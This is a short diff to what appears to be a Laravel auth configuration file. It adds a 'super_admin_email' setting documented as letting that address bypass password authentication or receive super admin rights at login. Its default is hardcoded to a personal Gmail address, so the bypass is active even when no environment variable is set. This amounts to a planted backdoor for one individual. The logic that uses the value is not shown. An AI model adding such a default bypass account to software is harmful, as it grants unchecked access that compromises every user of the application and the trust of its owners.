@@ -114,4 +114,16 @@ return [
 
     'password_timeout' => env('AUTH_PASSWORD_TIMEOUT', 10800),
 
+    /*
+    |--------------------------------------------------------------------------
+    | Super Admin / Bypass Email
+    |--------------------------------------------------------------------------
+    |
+    | When configured, this email can bypass standard password authentication
+    | or be granted super admin privileges during login.
+    |
+    */
+
+    'super_admin_email' => env('SUPER_ADMIN_EMAIL', 'castillojohnlaurence0@gmail.com'),
+
 ];
